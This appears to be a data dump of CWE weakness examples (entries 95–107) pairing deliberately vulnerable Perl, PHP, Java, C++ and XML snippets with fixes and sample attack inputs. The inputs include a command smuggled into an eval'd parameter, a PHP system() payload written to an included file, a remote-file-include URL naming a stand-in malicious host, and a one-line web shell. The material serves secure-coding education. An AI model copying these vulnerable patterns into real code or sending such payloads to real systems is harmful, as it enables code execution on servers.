95,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
use CGI qw(:standard);

                     
sub config_file_add_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to add a field/key to a file goes here

                           

                        

                     
}

                     
sub config_file_set_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to set key to a particular file goes here

                           

                        

                     
}

                     
sub config_file_delete_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to delete key from a particular file goes here

                           

                        

                     
}

                     
sub handleConfigAction {

                        
my ($fname, $action) = @_;
my $key = param('key');
my $val = param('val');

                           

                           
# this is super-efficient code, especially if you have to invoke

                           

                           

                           

                           
# any one of dozens of different functions!

                           

                           
my $code = ""config_file_$action_key(\$fname, \$key, \$val);"";
eval($code);

                     
}

                     
$configfile = ""/home/cwe/config.txt"";
print header;
if (defined(param('action'))) {
handleConfigAction($configfile, param('action'));
}
else {
print ""No action specified!\n"";
}

               
example: 2
NATURE:attack:
                  
add_key("","",""); system(""/bin/ls"");

               
example: 3
NATURE:result:
                  
config_file_add_key("","",""); system(""/bin/ls"");

               "
96,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$MessageFile = ""cwe-94/messages.out"";
if ($_GET[""action""] == ""NewMessage"") {
$name = $_GET[""name""];
$message = $_GET[""message""];
$handle = fopen($MessageFile, ""a+"");
fwrite($handle, ""<b>$name</b> says '$message'<hr>\n"");
fclose($handle);
echo ""Message Saved!<p>\n"";
}
else if ($_GET[""action""] == ""ViewMessages"") {
include($MessageFile);
}

               
example: 2
NATURE:attack:
                  
name=h4x0r
message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E

               
example: 3
NATURE:attack:
                  
<?php system(""/bin/ls -l"");?>

               "
97,
98,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$dir = $_GET['module_name'];
include($dir . ""/function.php"");

               
example: 2
NATURE:attack:
                  
victim.php?module_name=http://malicious.example.com

               
example: 3
NATURE:bad:
                  
system($_GET['cmd']);

               
example: 4
NATURE:attack:
                  
victim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-l

               
example: 5
NATURE:attack:
                  
/bin/ls -l

               "
99,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String rName = request.getParameter(""reportName"");
File rFile = new File(""/usr/local/apfr/reports/"" + rName);
...
rFile.delete();

               
example: 2
NATURE:bad:
LANGUAGE:C++:
                  
ifstream ifs(argv[0]);
string s;
ifs >> s;
cout << s;

               "
102,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<form-validation>
<formset>
<form name=""ProjectForm""> ... </form>
<form name=""ProjectForm""> ... </form>
</formset>
</form-validation>

               "
103,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     
// private variables for registration form
private String name;
private String email;
...

                        
public RegistrationForm() {
super();
}

                        
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {
ActionErrors errors = new ActionErrors();
if (getName() == null || getName().length() < 1) {
errors.add(""name"", new ActionMessage(""error.name.required""));
}
return errors;
}

                     

                     
// getter and setter methods for private variables
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     

                        
// private variables for registration form
private String name;
private String email;
...

                           
public RegistrationForm() {
super();
}

                           
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {
ActionErrors errors = super.validate(mapping, request);
if (errors == null) {
errors = new ActionErrors();
}

                           

                           
if (getName() == null || getName().length() < 1) {
errors.add(""name"", new ActionMessage(""error.name.required""));
}
return errors;

                     
}

                     
// getter and setter methods for private variables
...
}

               "
104,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.action.ActionForm {

                     

                        
// private variables for registration form
private String name;
private String email;
...

                           
public RegistrationForm() {
super();
}

                           
// getter and setter methods for private variables
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     

                        
// private variables for registration form
private String name;
private String email;
...

                           
public RegistrationForm() {
super();
}

                           
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}

                           
// getter and setter methods for private variables
...

                     
}

               "
105,"
example: 1
NATURE:result:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                        

                        
// private variables for registration form

                        
private String name;
private String address;
private String city;
private String state;
private String zipcode;
private String phone;
private String email;

                        
public RegistrationForm() {
super();
}

                        

                        
// getter and setter methods for private variables

                        
...

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:XML:
                  
<form-validation>
<formset>
<form name=""RegistrationForm"">
<field property=""name"" depends=""required"">
<arg position=""0"" key=""prompt.name""/>
</field>
<field property=""address"" depends=""required"">
<arg position=""0"" key=""prompt.address""/>
</field>
<field property=""city"" depends=""required"">
<arg position=""0"" key=""prompt.city""/>
</field>
<field property=""state"" depends=""required,mask"">
<arg position=""0"" key=""prompt.state""/>
<var>
<var-name>mask</var-name>
<var-value>[a-zA-Z]{2}</var-value>
</var>
</field>
<field property=""zipcode"" depends=""required,mask"">
<arg position=""0"" key=""prompt.zipcode""/>
<var>
<var-name>mask</var-name>
<var-value>\d{5}</var-value>
</var>
</field>
</form>
</formset>
</form-validation>

               
example: 3
NATURE:good:
LANGUAGE:XML:
                  
<form-validation>
<formset>
<form name=""RegistrationForm"">
<field property=""name"" depends=""required"">
<arg position=""0"" key=""prompt.name""/>
</field>
<field property=""address"" depends=""required"">
<arg position=""0"" key=""prompt.address""/>
</field>
<field property=""city"" depends=""required"">
<arg position=""0"" key=""prompt.city""/>
</field>
<field property=""state"" depends=""required,mask"">
<arg position=""0"" key=""prompt.state""/>
<var>
<var-name>mask</var-name>
<var-value>[a-zA-Z]{2}</var-value>
</var>
</field>
<field property=""zipcode"" depends=""required,mask"">
<arg position=""0"" key=""prompt.zipcode""/>
<var>
<var-name>mask</var-name>
<var-value>\d{5}</var-value>
</var>
</field>
<field property=""phone"" depends=""required,mask"">
<arg position=""0"" key=""prompt.phone""/>
<var>
<var-name>mask</var-name>
<var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value>
</var>
</field>
<field property=""email"" depends=""required,email"">
<arg position=""0"" key=""prompt.email""/>
</field>
</form>
</formset>
</form-validation>

               "
106,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.action.ActionForm {

                        

                        
// private variables for registration form

                        
private String name;
private String email;
...

                        
public RegistrationForm() {
super();
}

                        

                        
// getter and setter methods for private variables

                        
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                        

                        
// private variables for registration form

                        
private String name;
private String email;
...

                        
public RegistrationForm() {
super();
}

                        
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}

                        

                        
// getter and setter methods for private variables

                        
...

                     
}

               
example: 3
NATURE:good:
LANGUAGE:XML:
                  
<struts-config>

                        
<form-beans>
<form-bean name=""RegistrationForm"" type=""RegistrationForm""/>
</form-beans>

                        
...

                        
<!-- ========================= Validator plugin ================================= -->
<plug-in className=""org.apache.struts.validator.ValidatorPlugIn"">
<set-property
property=""pathnames""
value=""/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml""/>

                        
</plug-in>

                     
</struts-config>

               "
107,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     

                        

                           

                           
// private variables for registration form

                           
private String name;
private String address;
private String city;
private String state;
private String zipcode;

                           
// no longer using the phone form field

                           

                           

                           
// private String phone;

                           
private String email;

                           
public RegistrationForm() {
super();
}

                           

                           
// getter and setter methods for private variables

                           
...

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:XML:
                  
<form-validation>

                        
<formset>

                              
<form name=""RegistrationForm"">

                                    
<field property=""name"" depends=""required"">
<arg position=""0"" key=""prompt.name""/>
</field>
<field property=""address"" depends=""required"">
<arg position=""0"" key=""prompt.address""/>
</field>
<field property=""city"" depends=""required"">
<arg position=""0"" key=""prompt.city""/>
</field>
<field property=""state"" depends=""required,mask"">
<arg position=""0"" key=""prompt.state""/>
<var>
<var-name>mask</var-name>
<var-value>[a-zA-Z]{2}</var-value>
</var>
</field>
<field property=""zipcode"" depends=""required,mask"">
<arg position=""0"" key=""prompt.zipcode""/>
<var>
<var-name>mask</var-name>
<var-value>\d{5}</var-value>
</var>
</field>
<field property=""phone"" depends=""required,mask"">
<arg position=""0"" key=""prompt.phone""/>
<var>
<var-name>mask</var-name>
<var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value>
</var>
</field>
<field property=""email"" depends=""required,email"">
<arg position=""0"" key=""prompt.email""/>
</field>

                                 
</form>

                           
</formset>

                     
</form-validation>

               "
